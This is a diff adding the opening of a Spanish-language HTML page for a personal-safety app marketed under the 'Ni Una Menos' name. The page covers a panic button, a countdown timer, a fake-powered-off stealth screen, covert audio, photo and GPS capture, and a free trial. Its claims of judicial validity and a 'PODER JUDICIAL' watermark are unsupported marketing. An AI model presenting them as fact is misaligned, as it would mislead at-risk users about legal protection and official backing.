@@ -1,0 +1,2688 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<meta name="theme-color" content="#FFFFFF">
+<meta name="description" content="NI UNA MENOS ARGENTINA - Acta P4 - Cadena de Custodia Judicial">
+<meta property="og:title" content="NI UNA MENOS ARGENTINA">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<link rel="manifest" href="manifest.json">
+<title>NI UNA MENOS - ENERGY 2026 | GLAMOUR PREMIUM</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@500;600;700;800;900&family=Cormorant+Garamond:ital,wght@0,600;0,700;1,600&family=Montserrat:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@500;700;800&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
+
+<script>
+(function(){
+    var css = `
+:root{
+  --blanco:#FFFFFF;--negro:#050505;--texto:#1A1A1A;
+  --oroOscuro:#5A3E00;--oroMedio:#A87F0A;--oro:#D4AF37;--oroClaro:#FFF0A8;
+  --bordeOro:linear-gradient(135deg,#5A3E00 0%,#A87F0A 15%,#D4AF37 38%,#FFF0A8 50%,#FFE79B 52%,#D4AF37 65%,#A87F0A 85%,#5A3E00 100%);
+  --luz:0 0 0 1.5px rgba(212,175,55,.25),0 15px 35px rgba(0,0,0,.05),0 2px 15px rgba(212,175,55,.1) inset;
+  --luzFuerte:0 0 0 2px rgba(212,175,55,.7),0 0 45px rgba(212,175,55,.45),0 0 90px rgba(212,175,55,.3),0 15px 45px rgba(0,0,0,.15);
+  --luzRelieve:inset 0 2px 0 rgba(255,255,255,.95),inset 0 -10px 22px rgba(138,101,8,.22),0 10px 28px rgba(0,0,0,.15);
+  --blur:blur(15px);
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{width:100%;max-width:100vw;overflow-x:hidden;background:#FFFFFF;color:var(--texto);font-family:'Montserrat',sans-serif;font-weight:500;-webkit-font-smoothing:antialiased;font-size:17.5px;}
+body{background:#FFFFFF;background-image:radial-gradient(circle at 50% 0%,rgba(212,175,55,0.05) 0%,transparent 60%);}
+::selection{background:#FFE79B;color:#3A2800}
+::-webkit-scrollbar{width:8px}::-webkit-scrollbar-track{background:#fff}::-webkit-scrollbar-thumb{background:var(--bordeOro);border-radius:999px}
+
+.logo{width:190px;height:190px;margin:0 auto;position:relative;perspective:2400px;transform-style:preserve-3d;animation:flotar 7s ease-in-out infinite}
+.logo *{position:absolute;inset:0;border-radius:50%}
+.logo .aro{border:2px solid transparent;background:conic-gradient(from 0deg,transparent,var(--oro),#fff,var(--oroClaro),var(--oro),transparent);-webkit-mask:radial-gradient(circle,transparent 69%,#000 69.5%,#000 72.5%,transparent 73%);filter:drop-shadow(0 0 22px #FFE79B) drop-shadow(0 0 50px rgba(212,175,55,.65))}
+.logo .a1{transform:rotateX(72deg);animation:girar 5.5s linear infinite}
+.logo .a2{inset:8px;transform:rotateX(-62deg) rotateY(26deg);animation:girar 9s linear infinite reverse}
+.logo .a3{inset:16px;transform:rotateY(52deg);animation:girar 13s linear infinite}
+.logo .a4{inset:24px;border:1.5px solid #fff;box-shadow:0 0 25px #fff inset,0 0 45px #FFE79B,0 0 80px var(--oro);animation:pulsoLuz 3.2s ease-in-out infinite, girar 20s linear infinite}
+.logo .a5{inset:32px;border:1px dashed rgba(212,175,55,.6);animation:girar 30s linear infinite reverse}
+.logo .centro{inset:40px;border-radius:50%;background:radial-gradient(circle at 30% 20%,#FFFFFF,#FFF8DC 35%,#E6C76B 62%,#A87F0A 88%,#5A3E00 100%);box-shadow:var(--luzFuerte),var(--luzRelieve);display:grid;place-items:center;border:2px solid #fff}
+.logo b{font-family:'Cinzel',serif;font-weight:900;font-size:80px;letter-spacing:-3px;background:linear-gradient(180deg,#3A2800 0%,#7A5200 22%,#D4AF37 50%,#FFFFFF 58%,#FFE79B 66%,#A87F0A 80%,#5A3E00 100%);-webkit-background-clip:text;background-clip:text;color:transparent;filter:drop-shadow(0 2px 0 #fff) drop-shadow(0 8px 15px rgba(0,0,0,0.85));}
+
+@keyframes girar{to{transform:rotate(360deg)}}
+@keyframes flotar{0%,100%{transform:translateY(0) rotateY(-7deg)}50%{transform:translateY(-12px) rotateY(7deg)}}
+@keyframes pulsoLuz{0%,100%{opacity:.7}50%{opacity:1;box-shadow:0 0 45px #fff inset,0 0 70px #FFE79B,0 0 120px var(--oro)}}
+
+.hero{padding:25px 12px 14px;text-align:center;border-bottom:1px solid #FFE79B;background:transparent;position:relative;}
+.hero::after{content:"";position:absolute;bottom:0;left:0;right:0;height:1px;background:var(--bordeOro)}
+.hero h1{font-family:'Cinzel',serif;font-weight:900;font-size:clamp(32px,9vw,86px);letter-spacing:14px;line-height:1.02;color:var(--negro);margin-top:10px;text-shadow:0 2px 0 #fff,0 1px 0 rgba(212,175,55,.4)}
+.hero h2{font-family:'Cormorant Garamond',serif;font-weight:800;font-style:italic;font-size:clamp(20px,5vw,38px);letter-spacing:6px;background:var(--bordeOro);-webkit-background-clip:text;background-clip:text;color:transparent;margin-top:4px;}
+.hero .tag{font-family:'Cinzel',serif;letter-spacing:8px;font-size:12px;color:var(--oroOscuro);margin-top:12px;text-transform:uppercase;font-weight:800}
+.hero p{margin-top:15px;font-size:15px;color:#333;max-width:820px;margin-inline:auto;line-height:1.8;font-weight:500}
+.hero p strong {font-size: 17px;}
+
+.caja{position:relative;background:rgba(255,255,255,0.85);backdrop-filter:var(--blur);-webkit-backdrop-filter:var(--blur);border-radius:20px;padding:28px 20px;margin-bottom:20px;box-shadow:var(--luz);transition:.45s;border:1px solid rgba(212,175,55,0.15);}
+.caja:hover{transform:translateY(-3px);box-shadow:var(--luzFuerte);border-color:rgba(212,175,55,0.4);}
+.caja h3{font-family:'Cinzel',serif;letter-spacing:6px;font-size:20px;text-align:center;background:var(--bordeOro);-webkit-background-clip:text;background-clip:text;color:transparent;margin-bottom:18px;font-weight:900;}
+
+.paso{display:flex;gap:15px;padding:15px 0;border-bottom:1px dashed rgba(212,175,55,.2);align-items:flex-start}
+.paso:last-child{border-bottom:none;}
+.paso .n{width:38px;height:38px;border-radius:50%;background:var(--bordeOro);color:#FFFFFF;font-family:'Cinzel',serif;font-weight:900;font-size:18px;display:grid;place-items:center;flex:none;box-shadow:var(--luzRelieve);}
+.paso b{display:block;font-family:'Cinzel',serif;letter-spacing:2px;font-size:15px;color:var(--negro);font-weight:800;text-transform:uppercase}
+.paso span{color:#555;font-size:14px;font-weight:400;margin-top:4px;line-height:1.6;display:block}
+
+.btn{position:relative;width:100%;max-width:700px;margin:0 auto;display:flex;align-items:center;justify-content:center;padding:20px 24px;border-radius:999px;border:none;cursor:pointer;font-family:'Cinzel',serif;font-weight:900;letter-spacing:4.5px;font-size:13.5px;text-transform:uppercase;background:var(--bordeOro);color:#FFFFFF;text-shadow:0 1px 2px rgba(0,0,0,.3);box-shadow:var(--luz);overflow:hidden;transition:.4s}
+.btn::before{content:"";position:absolute;inset:0;background:linear-gradient(110deg,transparent 22%,rgba(255,255,255,0.8) 50%,transparent 78%);transform:translateX(-130%);transition:1s}
+.btn:hover{transform:translateY(-2px);box-shadow:var(--luzFuerte);letter-spacing:5.5px}
+.btn:hover::before{transform:translateX(130%)}
+.btn:active{transform:scale(.98)}
+.btn.rubi{background:linear-gradient(135deg,#8B0000,#C70020,#8B0000,#4A0008);color:#fff;box-shadow:0 0 0 1.5px rgba(176,0,32,.5),0 15px 40px rgba(176,0,32,.45)}
+.btn.blanco{background:transparent;color:var(--oroOscuro);border:1.5px solid var(--oroMedio);box-shadow:none;text-shadow:none}
+.btn.blanco:hover{box-shadow:var(--luz);background:#FFFCF2;}
+.btn.volver{background:transparent;box-shadow:none;color:var(--oroOscuro);font-size:12px;letter-spacing:4px;width:auto;padding:4px 0;border:none;text-shadow:none}
+
+.campo{margin-bottom:18px}
+.campo label{display:block;font-family:'Cinzel',serif;letter-spacing:5px;font-size:12px;color:var(--oroOscuro);font-weight:900;margin-bottom:8px;text-transform:uppercase}
+.campo input{width:100%;padding:18px;border-radius:12px;background:#FAFAFA;border:1px solid rgba(212,175,55,0.3);color:var(--negro);font-size:17px;font-weight:600;outline:none;transition:.35s;box-sizing:border-box;}
+.campo input:focus{background:#FFF;border-color:var(--oro);box-shadow:0 0 0 3px rgba(212,175,55,.15),0 0 25px rgba(212,175,55,.2);transform:translateY(-1px)}
+.mono,.campo input[inputmode="numeric"]{font-family:'JetBrains Mono',monospace;font-weight:600;letter-spacing:3px}
+
+.plan{position:relative;padding:28px 18px;border-radius:18px;background:rgba(255,255,255,0.9);box-shadow:var(--luz);margin-bottom:15px;cursor:pointer;transition:.4s;border:1px solid rgba(212,175,55,0.2);}
+.plan:hover{transform:translateY(-3px);box-shadow:var(--luzFuerte);border-color:var(--oro);}
+.plan.diamante{transform:scale(1.02);background:linear-gradient(180deg,#FFFCF2,#FFFFFF);border:1px solid var(--oro);}
+.plan .n{font-family:'Cinzel',serif;font-weight:900;letter-spacing:3.5px;color:var(--negro);font-size:15px;text-align:center;text-transform:uppercase}
+.plan .p{font-family:'Cinzel',serif;font-weight:900;font-size:42px;letter-spacing:.5px;text-align:center;background:var(--bordeOro);-webkit-background-clip:text;background-clip:text;color:transparent;margin:8px 0 0 0;line-height:1.1;}
+.plan.diamante .p{font-size:48px}
+.plan .etiqueta{position:absolute;top:-10px;right:15px;background:var(--blanco);color:var(--oroOscuro);border:1px solid var(--oro);font-family:'Cinzel',serif;font-weight:900;letter-spacing:2px;font-size:10px;padding:6px 14px;border-radius:999px;box-shadow:0 4px 10px rgba(212,175,55,0.15);}
+
+.llave{font-family:'JetBrains Mono',monospace;font-size:28px;letter-spacing:8px;text-align:center;padding:25px;border-radius:12px;border:1px solid var(--oro);background:#FAFAFA;color:var(--oroOscuro);font-weight:600;box-shadow:var(--luz);word-break:break-all;}
+
+.vista{display:none;flex-direction:column;gap:15px;width:100%;max-width:820px;margin:0 auto;padding:20px 12px 60px}
+.vista.activa{display:flex;animation:entrar .6s ease both}
+@keyframes entrar{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:none}}
+.tit{font-family:'Cinzel',serif;letter-spacing:6px;text-align:center;background:var(--bordeOro);-webkit-background-clip:text;background-clip:text;color:transparent;font-size:clamp(26px,7vw,44px);font-weight:900;margin:10px 0 15px}
+
+.sos{height:320px;display:grid;place-items:center;position:relative}
+.onda{position:absolute;width:270px;height:270px;border-radius:50%;background:radial-gradient(circle,rgba(139,0,0,.45),transparent 75%);animation:onda 2.2s infinite}
+.onda.d2{animation-delay:.7s}.onda.d3{animation-delay:1.4s}
+@keyframes onda{0%{transform:scale(.75);opacity:1}100%{transform:scale(2.5);opacity:0}}
+.bSOS{position:relative;z-index:5;width:210px;height:210px;border-radius:50%;border:2px solid var(--oroMedio);cursor:pointer;color:var(--oroClaro);font-family:'Cinzel',serif;font-weight:900;font-size:32px;letter-spacing:4px;background:radial-gradient(circle at 30% 22%,#7A0010,#4A0008 80%);text-shadow:0 2px 4px rgba(0,0,0,.7);box-shadow:0 0 0 0 rgba(139,0,0,.7), inset 0 4px 15px rgba(255,255,255,.1);animation:pulso 2s infinite;transition: all 0.3s ease;}
+@keyframes pulso{to{box-shadow:0 0 0 48px rgba(139,0,0,0), inset 0 4px 15px rgba(255,255,255,.1)}}
+.bSOS.activo {background: radial-gradient(circle at 30% 22%, #FFE79B, #D4AF37 80%);color: #5A3E00;border-color: #5A3E00;text-shadow: none;font-size: 20px;animation: none;box-shadow: 0 4px 15px rgba(212,175,55,.4), inset 0 4px 15px rgba(255,255,255,.4);}
+
+.estadoSOS{display:none;padding:20px;border-radius:16px;background:#FFF3F5;border:1px solid #8B0000;color:#8B0000;text-align:center;font-weight:600;font-size:14px;line-height:1.6}
+
+.ruta-animada { stroke-dasharray: 12, 12; animation: dash 1s linear infinite; }
+@keyframes dash { to { stroke-dashoffset: -24; } }
+
+.acta{background:#FFFFFF;color:#333;padding:25px;font-family:'Cormorant Garamond',serif;font-weight:600;position:relative;box-shadow:0 15px 50px rgba(0,0,0,.08);border:1px solid #EEE;border-radius:8px;margin-bottom:20px;transition: transform 0.3s;page-break-inside: avoid;width:100%;box-sizing:border-box;}
+.acta:hover{transform: translateY(-2px);box-shadow:0 20px 60px rgba(0,0,0,.12);}
+.acta::before{content:"NI UNA MENOS ARGENTINA - PODER JUDICIAL";position:absolute;inset:auto 0;top:42%;text-align:center;font-family:'Cinzel',serif;font-weight:900;font-size:45px;letter-spacing:10px;color:rgba(90,62,0,.04);transform:rotate(-18deg);pointer-events:none;z-index:0;}
+.acta h3{font-family:'Cinzel',serif;font-weight:800;letter-spacing:3px;font-size:15px;border-bottom:1px solid #DDD;margin:15px 0 8px;text-transform:uppercase;color:var(--oroOscuro);position:relative;z-index:3;}
+.acta .t{width:100%;border-collapse:collapse;font-size:14px;font-weight:500;position:relative;z-index:3;}
+.acta .t th,.acta .t td{border:1px solid #EEE;padding:8px}
+.acta .t th{background:#FAFAFA;font-family:'Cinzel',serif;color:var(--oroOscuro)}
+.acta .mono{font-family:'JetBrains Mono',monospace;font-size:12px;background:#FAFAFA;padding:10px;border:1px solid #EEE;word-break:break-all;color:#555;font-weight:500;position:relative;z-index:3;}
+.acta .nroExpediente{font-family:'JetBrains Mono',monospace;color:var(--oroOscuro);font-weight:900;font-size: 15px;margin-bottom:4px;}
+.acta .firmas{display:grid;grid-template-columns:1fr 1fr 1fr;gap:18px;margin-top:30px;text-align:center;position:relative;z-index:3;}
+.acta .firmas div{border-top:1px solid #CCC;padding-top:14px;font-family:'Cinzel',serif;font-size:12px;letter-spacing:2px;color:#555;font-weight:700}
+.mapa{height:250px;width:100%;border:1px solid #EEE;position:relative;z-index:3;border-radius:8px;}
+
+.galeria{display:flex;flex-direction:column;gap:20px;position:relative;z-index:3;width:100%;}
+.foto{background:#FAFAFA;border:1px solid #EEE;display:flex;flex-direction:column;align-items:center;justify-content:center;color:#999;font-family:'Cinzel',serif;font-size:10px;overflow:hidden;position:relative;width:100%;padding:15px;border-radius:8px;box-shadow:0 4px 10px rgba(0,0,0,0.05);}
+.foto img,.foto video{width:100%;height:auto;object-fit:contain;border-radius:8px;}
+.btn-descarga-evidencia{display:inline-block;margin-top:10px;padding:10px 18px;background:var(--bordeOro);color:#FFF;font-family:'Cinzel',serif;font-weight:900;font-size:12px;letter-spacing:2px;border-radius:999px;text-decoration:none;box-shadow:var(--luz);text-align:center;width:100%;max-width:320px;border:none;cursor:pointer;}
+
+.scroll-container{width:100%;overflow:hidden;mask-image:linear-gradient(to right,transparent,#000 10%,#000 90%,transparent);-webkit-mask-image:linear-gradient(to right,transparent,#000 10%,#000 90%,transparent)}
+.scroll-text{display:inline-block;white-space:nowrap;font-family:'Cinzel',serif;font-weight:800;}
+@keyframes marq{0%{transform:translateX(100%)}100%{transform:translateX(-100%)}}
+.top-marquee{margin-top:20px;background:linear-gradient(90deg,transparent,rgba(212,175,55,0.08),transparent);padding:14px 0;border-top:1px solid rgba(212,175,55,0.2);border-bottom:1px solid rgba(212,175,55,0.2)}
+.top-marquee .scroll-text{font-size:14px;letter-spacing:5px;color:var(--oroOscuro);animation:marq 60s linear infinite;}
+
+.footer-wrap{background:#FFFFFF;border-top:1px solid rgba(212,175,55,0.2);padding:24px 0;margin-top: 40px;}
+.footer-wrap .scroll-container{padding:12px 0;}
+.footer-wrap .scroll-text{font-size:13px;letter-spacing:6px;color:var(--oroOscuro);animation:marq 75s linear infinite;}
+footer{text-align:center;padding-top:20px;color:#888;font-family:'Montserrat',sans-serif;letter-spacing:3px;font-size:12px;font-weight:500;line-height:2}
+footer strong{font-family:'Cinzel',serif;font-weight:800;color:var(--oroOscuro);font-size:15px;letter-spacing:4px;}
+
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:20px}
+.info-bloque{padding:12px 0;border-bottom:1px solid rgba(212,175,55,.15)}
+.info-bloque:last-child{border-bottom:none}
+.info-bloque b{color:var(--oroOscuro);font-family:'Cinzel',serif;letter-spacing:2.5px;font-size:18px;font-weight:900;display:block;margin-bottom:8px;}
+.info-bloque p{font-size:15px;line-height:1.8;color:#555;font-weight:500}
+.ley{display:inline-block;padding:5px 12px;margin:4px;border-radius:999px;border:1px solid var(--oroMedio);color:var(--oroOscuro);font-family:'Cinzel',serif;font-weight:700;background:#FFFCF2}
+@media(max-width:640px){.grid2{grid-template-columns:1fr}}
+
+#btn-install-pwa {display:none;position:fixed;top:15px;right:15px;background:var(--oro);color:#fff;padding:8px 16px;border-radius:50px;font-family:'Cinzel',serif;font-weight:900;font-size:13px;letter-spacing:2px;border:1px solid var(--oroClaro);box-shadow:var(--luzFuerte);cursor:pointer;z-index:9999999;align-items:center;gap:8px;animation:entrar .5s ease both;}
+
+#btn-flotante-sos {display:none;position:fixed;bottom:25px;right:25px;width:75px;height:75px;background:radial-gradient(circle at 30% 22%,#D00000,#8B0000 80%);color:#fff;border-radius:50%;font-family:'Cinzel',serif;font-weight:900;font-size:16px;border:2px solid #FF8888;box-shadow:0 5px 20px rgba(139,0,0,0.6);cursor:pointer;z-index:9999999;align-items:center;justify-content:center;animation:pulsoSOS 2s infinite;}
+@keyframes pulsoSOS {0%{box-shadow:0 0 0 0 rgba(139,0,0,0.7);}70%{box-shadow:0 0 0 15px rgba(139,0,0,0);}100%{box-shadow:0 0 0 0 rgba(139,0,0,0);}}
+
+@media print {
+  @page { size: A4; margin: 10mm; }
+  body { background: #fff !important; color: #000 !important; }
+  .btn, .footer-wrap, .noimp, .btn-descarga-evidencia, .vista:not(.activa), header, .scroll-container, #btn-install-pwa, #btn-flotante-sos { display: none !important; }
+  .vista.activa { padding: 0 !important; max-width: 100% !important; display: block !important; }
+  #alertas, #listaBitacora { display: block !important; width: 100%; }
+  .acta { position: relative !important; left: auto !important; top: auto !important; width: 100% !important; border: 1px solid #ccc !important; box-shadow: none !important; page-break-inside: avoid; page-break-after: auto; margin: 0 0 20px 0 !important; }
+}
+
+.file-upload-wrapper {position:relative;width:100%;height:120px;border:2px dashed var(--oro);border-radius:12px;background:#FFFCF2;display:flex;align-items:center;justify-content:center;text-align:center;cursor:pointer;overflow:hidden;margin-top:10px;}
+.file-upload-wrapper input[type="file"] {position:absolute;top:0;left:0;width:100%;height:100%;opacity:0;cursor:pointer;}
+.file-upload-text {font-family:'Cinzel',serif;font-size:14px;font-weight:800;color:var(--oroOscuro);letter-spacing:2px;}
+.archivo-pendiente{display:flex;align-items:center;gap:10px;background:#FFFCF2;border:1px solid var(--oroMedio);border-radius:10px;padding:10px 12px;margin-bottom:8px;box-shadow:0 2px 6px rgba(212,175,55,.12);}
+.archivo-pendiente .ico{width:34px;height:34px;border-radius:8px;background:var(--bordeOro);color:#fff;display:grid;place-items:center;font-family:'Cinzel',serif;font-weight:900;font-size:11px;flex:none;}
+.archivo-pendiente .datos{flex:1;min-width:0;}
+.archivo-pendiente .datos b{display:block;font-family:'Montserrat',sans-serif;font-size:13px;color:var(--negro);font-weight:700;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.archivo-pendiente .datos span{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--oroOscuro);letter-spacing:1px;}
+.archivo-pendiente .quitar{width:30px;height:30px;border-radius:50%;border:none;background:#B00020;color:#fff;font-weight:900;cursor:pointer;font-size:15px;flex:none;box-shadow:0 2px 5px rgba(176,0,32,.4);}
+.archivo-pendiente .quitar:hover{background:#8B0000;}
+.btn-agregar-evidencia{display:inline-block;margin-top:8px;padding:9px 16px;background:#FFFCF2;color:var(--oroOscuro);font-family:'Cinzel',serif;font-weight:900;font-size:11px;letter-spacing:2px;border-radius:999px;text-decoration:none;text-align:center;border:1.5px solid var(--oroMedio);cursor:pointer;box-shadow:var(--luz);}
+.btn-agregar-evidencia:hover{background:#FFF0A8;}
+
+#modalStop {display:none;position:fixed;inset:0;background:rgba(0,0,0,0.95);z-index:9999999;flex-direction:column;align-items:center;justify-content:center;padding:20px;}
+#modalPresentacion {display:none;position:fixed;inset:0;background:rgba(0,0,0,0.88);z-index:9999999;flex-direction:column;align-items:center;justify-content:center;padding:20px;}
+#pantalla-sigilo {position:fixed;top:0;left:0;width:100vw;height:100vh;background:#000;z-index:9999999;display:flex;align-items:center;justify-content:center;}
+.debug-panel {display:none !important;}
+    `;
+    var s = document.createElement('style');
+    s.textContent = css;
+    document.head.appendChild(s);
+})();
+</script>
+</head>
+<body>
+
+<button id="btn-install-pwa">INSTALAR APP</button>
+<button id="btn-flotante-sos" onclick="if(window.sosActivo){ prepararParada('sos'); }else{ window.ir('sos'); disparoSOS('manual'); }">S.O.S</button>
+<div class="debug-panel" id="debugPanel"></div>
+
+<div class="app">
+<header>
+<div class="hero">
+ <div class="logo"><div class="aro a1"></div><div class="aro a2"></div><div class="aro a3"></div><div class="aro a4"></div><div class="aro a5"></div><div class="centro"><b>C4</b></div></div>
+ <h1>NI UNA MENOS</h1>
+ <h2>ARGENTINA - ENERGY 2026 - ACTA P4 JUDICIAL</h2>
+ <div class="tag">SALVAMOS VIDAS CON NUESTRO BLINDAJE PREVENTIVO</div>
+ <p><strong style="display:block;color:var(--oroOscuro);font-weight:800;margin-bottom:10px">Nuestras dos herramientas principales te protegen ante cualquier agresión o robo: el Botón Antipánico de impacto inmediato y el Modo Temporizador (Centinela).</strong>
+ Programá tu temporizador, activá el Modo Sigilo para engañar al agresor simulando que el celular está apagado, y nosotros recabaremos toda la evidencia forense de manera invisible. <strong>El delincuente no sabrá que el celular se convirtió en un perito judicial.</strong></p>
+
+ <div id="cajaHeaderDias" style="background:#FFFCF2;border:1.5px solid var(--oro);padding:22px;border-radius:12px;margin:25px auto;max-width:820px;box-shadow:var(--luz);transition:.3s;">
+  <b id="tituloHeaderDias" style="color:var(--oroOscuro);font-family:'Cinzel',serif;font-size:20px;letter-spacing:3px;display:block;margin-bottom:10px;">15 DIAS GRATIS</b>
+  <span id="subtituloHeaderDias" style="font-size:16px;color:#333;font-weight:600;line-height:1.5;display:block;">Descargá y registrate hoy mismo. Comprobá cómo funciona nuestro blindaje pericial corporativo sin costo.</span>
+ </div>
+
+ <button class="btn blanco" onclick="ir('login')" style="max-width:520px;margin-inline:auto;margin-top:15px;box-shadow:var(--luz)">CONSULTAR ACTAS / CENTRO JUDICIAL</button>
+ <button class="btn" id="btnVozPresentacion" onclick="leerVoz()" style="max-width:520px;margin-inline:auto;margin-top:15px;box-shadow:var(--luzFuerte)">🔊 PRESENTACION DE FUNCIONAMIENTO</button>
+ 
+ <div class="scroll-container top-marquee">
+  <div class="scroll-text">ACTIVACION INMEDIATA POR BOTON, IMPACTO O GRITO DE AUXILIO - RASTREO GPS SEGUNDO A SEGUNDO - GRABACION DE AUDIO OCULTA - VIDEO HD COMO EVIDENCIA - FOTOS AUTOMATICAS FRONTAL Y TRASERA - ALERTA SMS A FAMILIARES - MODO SIGILO - S.O.S. REMOTO -</div>
+ </div>
+</div>
+</header>
+
+<main>
+<section id="inicio" class="vista activa">
+  
+ <div id="bannerSuscripcion" style="display:none;background:linear-gradient(135deg,#D4AF37,#A87F0A);color:#fff;padding:15px;border-radius:12px;margin-bottom:20px;text-align:center;box-shadow:var(--luzFuerte);border:2px solid #FFF0A8;">
+   <b style="font-family:'Cinzel',serif;font-size:16px;letter-spacing:2px;display:block;">🛡️ BLINDAJE ACTIVO</b>
+   <span id="diasRestantesText" style="font-size:15px;font-weight:700;margin-top:5px;display:block;">Calculando días restantes...</span>
+ </div>
+
+ <div id="zonaOk" style="display:none;padding-bottom:20px;">
+  <div class="caja" style="background:#FFF3F5;border:1px solid #8B0000;padding:28px;">
+   <h3 style="color:#8B0000;border:none;margin-bottom:12px;letter-spacing:4px;text-shadow:none">PROTECCION ACTIVA</h3>
+   <p style="text-align:center;font-size:15px;color:#333;margin-bottom:18px;line-height:1.6;font-weight:600;">Tu vida es nuestra prioridad. Contás con dos escudos: el Botón Antipánico para emergencias súbitas, o el Temporizador Centinela para protección preventiva.</p>
+   <button class="btn rubi" onclick="if(window.sosActivo){ window.ir('sos'); prepararParada('sos'); } else { irSOS(); }">INGRESAR AL BOTON ANTIPANICO</button>
+   <button class="btn" onclick="ir('bitacora')" style="margin-top:12px;">📓 DIARIO DE INCIDENTES Y PRUEBAS</button>
+  </div>
+
+  <div id="cajaCompletarImei" class="caja" style="display:none; margin-top:15px; background:#FFFCF2; border:2px dashed var(--oro);">
+    <h3 style="color:var(--oroOscuro); font-size:16px; margin-bottom:8px;">⚖️ VALIDACIÓN PERICIAL DEL EQUIPO (OPCIONAL)</h3>
+    <p style="font-size:13.5px; color:#444; margin-bottom:14px; text-align:center; line-height:1.5;">Tu protección de 15 días ya está 100% activa. Para que el <b>Acta Pericial Judicial</b> incluya la identidad física de tu teléfono, podés vincular tu IMEI marcando <b>*#06#</b> en tu teclado de llamadas.</p>
+    <div class="campo" style="margin-bottom:12px;">
+      <input id="imeiPostRegistro" inputmode="numeric" maxlength="15" placeholder="Ingresá los 15 dígitos del IMEI" style="text-align:center;">
+    </div>
+    <button class="btn" onclick="guardarImeiReal()">VINCULAR IMEI AL ACTA JUDICIAL</button>
+  </div>
+  
+  <div class="caja" style="margin-top:15px; border-color: var(--oro);">
+    <h3 style="color:var(--oroOscuro); font-size:18px; margin-bottom:10px;">MODO CENTINELA (TEMPORIZADOR)</h3>
+    <p style="font-size:13px; margin-bottom:15px; text-align:center; line-height:1.5;">Programá el tiempo que vas a estar afuera. Si no cancelás el contador con tu Llave Maestra antes de que termine, el S.O.S se disparará automáticamente salvando tu vida.<br><br><b style="color:#8B0000;">IMPORTANTE: Para que el reloj no se duerma y detone con precisión, debés activar obligatoriamente el "Modo Sigilo" justo después de iniciar este temporizador.</b></p>
+    <div style="display:flex; gap:10px; margin-bottom:15px;">
+      <div class="campo" style="flex:1; margin-bottom:0;"><label style="text-align:center">HORAS</label><input id="cHoras" type="number" min="0" max="24" value="0" style="text-align:center"></div>
+      <div class="campo" style="flex:1; margin-bottom:0;"><label style="text-align:center">MINUTOS</label><input id="cMin" type="number" min="0" max="59" value="30" style="text-align:center"></div>
+    </div>
+    <button class="btn" onclick="if(localStorage.getItem('centinelaEnd')){ prepararParada('centinela'); }else{ iniciarCentinela(); }" id="btnCentinela">ACTIVAR CENTINELA</button>
+    <div id="cronoDisplay" style="display:none; text-align:center; font-family:'JetBrains Mono', monospace; font-size:42px; color:#8B0000; font-weight:900; margin-top:15px; text-shadow: 0 2px 4px rgba(0,0,0,0.1);">00:00:00</div>
+  </div>
+ </div>
+ 
+ <div style="background:#FFF3F5;border:1px solid #8B0000;padding:16px;border-radius:12px;margin-bottom:22px;text-align:left;box-shadow:var(--luz);">
+    <b style="color:#8B0000;font-family:'Cinzel',serif;font-size:14px;letter-spacing:1px;display:block;margin-bottom:8px;">MODO SIGILO ACTIVO</b>
+    <span style="font-size:13.5px;color:#333;font-weight:600;line-height:1.5;display:block;">Tocá el botón <b>"MODO SIGILO"</b> al final de esta página para simular que el teléfono está apagado (pantalla negra). Este modo es vital: mantiene el Temporizador Centinela despierto en primer plano y el sistema quedará 100% alerta esperando un impacto, o un <b>grito fuerte / ruido violento</b> para recabar la evidencia de manera totalmente silenciosa.</span>
+ </div>
+
+ <div class="caja"><h3>5 PASOS PARA ACTIVAR</h3>
+  <div class="paso"><div class="n">I</div><div><b>NOMBRE Y APELLIDO</b><span>Datos de la persona a proteger</span></div></div>
+  <div class="paso"><div class="n">II</div><div><b>VALIDACIÓN RÁPIDA</b><span>Tu número de celular para registro único</span></div></div>
+  <div class="paso"><div class="n">III</div><div><b>2 CONTACTOS</b><span>Alerta automática a familiares por SMS y Email</span></div></div>
+  <div class="paso"><div class="n">IV</div><div><b>15 DÍAS DE PRUEBA GRATIS</b><span>Activación inmediata sin costo y sin ingresar tarjetas</span></div></div>
+  <div class="paso"><div class="n">V</div><div><b>LLAVE C4</b><span>Única - intransferible - válida judicialmente</span></div></div>
+ </div>
+
+ <div class="caja"><h3>NUESTRAS HERRAMIENTAS VITALES</h3>
+  <div class="grid2">
+   <div class="info-bloque"><b>BOTON ANTIPANICO (S.O.S)</b><p>Herramienta principal ante peligro inminente. Un solo toque despacha alertas y recaba evidencia forense al instante.</p></div>
+   <div class="info-bloque"><b>TEMPORIZADOR CENTINELA</b><p>Herramienta principal preventiva. Si no ingresás tu llave antes de que el tiempo acabe, el sistema asume peligro y estalla el S.O.S.</p></div>
+   <div class="info-bloque"><b>MODO SIGILO (PANTALLA NEGRA)</b><p>Herramienta complementaria. Simula que el celular está apagado, engaña al ladrón y habilita la detección acústica silenciosa de gritos fuertes.</p></div>
+   <div class="info-bloque"><b>TRAMPA DE CURIOSIDAD (REMOTO)</b><p>Si te roban, activá el rastreo desde otro celular. Cuando el ladrón abra nuestra app por curiosidad, la trampa se cierra: le saca fotos ocultas y envía su GPS de inmediato.</p></div>
+  </div>
+  <div style="margin-top:15px;text-align:center">
+   <span class="ley">LEY 26.485</span><span class="ley">LEY 25.326</span><span class="ley">CÓDIGO PROCESAL PENAL</span>
+  </div>
+ </div>
+
+ <button class="btn" onclick="ir('registro')">ACTIVAR 15 DÍAS GRATIS</button>
+ <button class="btn blanco" onclick="ir('pago')" style="margin-top:12px;">PAGO / PLANES</button>
+ <button class="btn blanco" onclick="ir('recuperar')" style="margin-top:12px;">RECUPERAR - S.O.S. REMOTO</button>
